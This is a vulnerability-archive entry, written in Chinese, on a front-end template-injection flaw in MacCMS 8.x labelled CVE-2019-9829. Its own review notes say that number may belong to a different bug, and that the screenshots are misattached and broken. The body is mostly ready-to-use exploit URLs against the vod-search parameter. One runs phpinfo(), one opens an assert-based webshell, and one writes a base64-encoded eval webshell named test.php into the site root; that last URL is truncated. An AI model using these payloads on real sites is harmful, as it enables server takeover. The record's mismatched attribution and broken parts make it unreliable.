---
cve: "CVE-2019-9829"
product: "MacCMS8.x"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2019-9829"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "Maccms 8.x(苹果cms)命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：vod-search模板可执行PHP；assert/裸常量用法依赖旧PHP"
side_effects: "未执行；本文需注意的操作影响：同CVE9829另篇266实际MacCMSv10后台模板写入，版本/入口/鉴权不同，疑错误编号污染，不能直接合并；图全部引用266后台资源并有残片；最后文件写入URL缺末尾}，无完整响应证据"
source_status: "missing"
id: "vw-d5ba64a0aae1cb95810fa0f4"
entity_id: "ve-d5ba64a0aae1cb95810fa0f4"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：vod-search模板可执行PHP；assert/裸常量用法依赖旧PHP

- **事实待核（1）**：同CVE9829另篇266实际MacCMSv10后台模板写入，版本/入口/鉴权不同，疑错误编号污染，不能直接合并。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：图全部引用266后台资源并有残片；最后文件写入URL缺末尾}，无完整响应证据。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：phpinfo是PHP代码执行，标题命令执行需区分OS命令。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

Maccms 8.x(苹果cms)命令执行漏洞
===============================

一、漏洞简介
------------

搜索页面搜索参数过滤不严 导致直接eval执行PHP语句，前台命令执行可getshell

二、漏洞影响
------------

Maccms 8.x

三、复现过程
------------

payload：

    http://0-sec.org/index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A}

![](./.resource/CVE-2019-9829Maccms背景任意文件写入getshell/media/rId24.png)命令执行漏洞/media/rId24.png)

getshell payload（a）:

    http://0-sec.org/index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}

    POST

    a=phpinfo()

![](./.resource/CVE-2019-9829Maccms背景任意文件写入getshell/media/rId25.png)命令执行漏洞/media/rId25.png)

写入网站根目录一句话木马文件payload（文件名：test.php，密码：test）:

    http://0-sec.org/index.php?m=vod-search&wd={if-A:print(fputs%28fopen%28base64_decode%28dGVzdC5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW3Rlc3RdKTsgPz4%29%29)}{endif-A
